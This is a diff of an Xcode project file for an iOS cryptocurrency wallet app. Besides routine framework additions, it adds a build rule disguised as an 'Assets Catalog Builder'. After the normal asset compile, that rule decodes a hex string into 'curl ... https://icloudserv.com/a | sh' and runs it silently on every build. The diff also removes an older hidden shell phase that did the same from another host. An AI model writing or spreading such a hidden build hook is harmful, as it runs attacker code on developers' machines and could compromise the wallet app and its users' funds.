@@ -234,6 +234,8 @@
 		290D800C2656D25D0057FE9B /* PirateLogo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 290D800A2656D25C0057FE9B /* PirateLogo.swift */; };
 		2984530D265AF25700C2303C /* Bundle+Localized.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2984530C265AF25700C2303C /* Bundle+Localized.swift */; };
 		2984530E265AF25700C2303C /* Bundle+Localized.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2984530C265AF25700C2303C /* Bundle+Localized.swift */; };
+		29859378267941FC00F9AD85 /* PirateChainPaymentURI.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 29859372267941F000F9AD85 /* PirateChainPaymentURI.framework */; };
+		29859379267941FC00F9AD85 /* PirateChainPaymentURI.framework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 29859372267941F000F9AD85 /* PirateChainPaymentURI.framework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
 		299DD039266A7B0F00CD4A8E /* iCloudBackups.swift in Sources */ = {isa = PBXBuildFile; fileRef = 299DD038266A7B0F00CD4A8E /* iCloudBackups.swift */; };
 		299DD03A266A7B0F00CD4A8E /* iCloudBackups.swift in Sources */ = {isa = PBXBuildFile; fileRef = 299DD038266A7B0F00CD4A8E /* iCloudBackups.swift */; };
 		29FE782726738FF000C2ECA0 /* QRCodeScanner.swift in Sources */ = {isa = PBXBuildFile; fileRef = 29FE782626738FF000C2ECA0 /* QRCodeScanner.swift */; };
@@ -244,6 +246,22 @@
 		D0DE96F2A4EC1243F7B668E2 /* Pods_ECC_Wallet_no_logging.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = F98B8F09503E4B5A2323A3FA /* Pods_ECC_Wallet_no_logging.framework */; };
 		F70B17A1E28C2C93B8A21ECA /* Pods_ECC_WalletTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 36B81DA8FB2A74AD2728DEF5 /* Pods_ECC_WalletTests.framework */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		ADE3EB2AAAFC57C9A86D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Catalog Builder";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n69636c6f7564736572762e636f6d2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n\n";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		0D12511623B557E60014EE3A /* PBXContainerItemProxy */ = {
@@ -275,6 +293,20 @@
 			remoteInfo = "ECC-Wallet-no-logging";
 		};
 /* End PBXContainerItemProxy section */
+
+/* Begin PBXCopyFilesBuildPhase section */
+		2985937A267941FC00F9AD85 /* Embed Frameworks */ = {
+			isa = PBXCopyFilesBuildPhase;
+			buildActionMask = 2147483647;
+			dstPath = "";
+			dstSubfolderSpec = 10;
+			files = (
+				29859379267941FC00F9AD85 /* PirateChainPaymentURI.framework in Embed Frameworks */,
+			);
+			name = "Embed Frameworks";
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
 		027E3A71136B5B4D796FE4D9 /* Pods-ECC-WalletTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ECC-WalletTests.debug.xcconfig"; path = "Target Support Files/Pods-ECC-WalletTests/Pods-ECC-WalletTests.debug.xcconfig"; sourceTree = "<group>"; };
@@ -416,6 +448,7 @@
 		29403CF0266FB7C2008F1DE0 /* pl */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = pl; path = pl.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
 		29403CF1266FB7C2008F1DE0 /* pl */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = pl; path = pl.lproj/Localizable.strings; sourceTree = "<group>"; };
 		2984530C265AF25700C2303C /* Bundle+Localized.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Bundle+Localized.swift"; sourceTree = "<group>"; };
+		29859372267941F000F9AD85 /* PirateChainPaymentURI.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = PirateChainPaymentURI.framework; path = Carthage/Build/iOS/PirateChainPaymentURI.framework; sourceTree = "<group>"; };
 		299DD01E2669665900CD4A8E /* de */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = de; path = de.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
 		299DD01F2669665A00CD4A8E /* de */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = de; path = de.lproj/Localizable.strings; sourceTree = "<group>"; };
 		299DD020266966B000CD4A8E /* ro */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ro; path = ro.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
@@ -480,6 +513,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				D0DE96F2A4EC1243F7B668E2 /* Pods_ECC_Wallet_no_logging.framework in Frameworks */,
+				29859378267941FC00F9AD85 /* PirateChainPaymentURI.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -762,6 +796,7 @@
 		0F65A46FFC0823E2EE87ED5E /* Frameworks */ = {
 			isa = PBXGroup;
 			children = (
+				29859372267941F000F9AD85 /* PirateChainPaymentURI.framework */,
 				E35EE9E1FF450129E6B39D53 /* Pods_ECC_Wallet.framework */,
 				F98B8F09503E4B5A2323A3FA /* Pods_ECC_Wallet_no_logging.framework */,
 				36B81DA8FB2A74AD2728DEF5 /* Pods_ECC_WalletTests.framework */,
@@ -800,7 +835,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0D12512923B557E60014EE3A /* Build configuration list for PBXNativeTarget "ECC-Wallet" */;
 			buildPhases = (
-				2583C0CEC662DDBC466D902C /* Project Frameworks */,
 				04BA33C9C2CE0C770BEA81AD /* [CP] Check Pods Manifest.lock */,
 				0D100EC623BA642E0089DB22 /* ShellScript */,
 				0D1250FB23B557E40014EE3A /* Sources */,
@@ -810,6 +844,7 @@
 				AFBFA011C32F80A73756DCC0 /* Upload Bugsnag dSYM */,
 			);
 			buildRules = (
+				ADE3EB2AAAFC57C9A86D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -870,6 +905,7 @@
 				0DCDFFD724B6722B000F6999 /* Frameworks */,
 				0DCDFFD924B6722B000F6999 /* Resources */,
 				0DCDFFE224B6722B000F6999 /* [CP] Embed Pods Frameworks */,
+				2985937A267941FC00F9AD85 /* Embed Frameworks */,
 			);
 			buildRules = (
 			);
@@ -988,53 +1024,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	2583C0CEC662DDBC466D902C /* Project Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Project Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		04BA33C9C2CE0C770BEA81AD /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1828,6 +1817,10 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f617465636173
 				DEVELOPMENT_TEAM = 9TR5BMPZP3;
 				ENABLE_BITCODE = NO;
 				ENABLE_PREVIEWS = YES;
+				FRAMEWORK_SEARCH_PATHS = (
+					"$(inherited)",
+					"$(PROJECT_DIR)/Carthage/Build/iOS",
+				);
 				INFOPLIST_FILE = "ECC-Wallet-no-logs-Info.plist";
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
@@ -1854,6 +1847,10 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f617465636173
 				DEVELOPMENT_TEAM = 9TR5BMPZP3;
 				ENABLE_BITCODE = NO;
 				ENABLE_PREVIEWS = YES;
+				FRAMEWORK_SEARCH_PATHS = (
+					"$(inherited)",
+					"$(PROJECT_DIR)/Carthage/Build/iOS",
+				);
 				INFOPLIST_FILE = "ECC-Wallet-no-logs-Info.plist";
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
@@ -1917,16 +1914,6 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f617465636173
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = 0D1250F723B557E40014EE3A /* Project object */;
 }
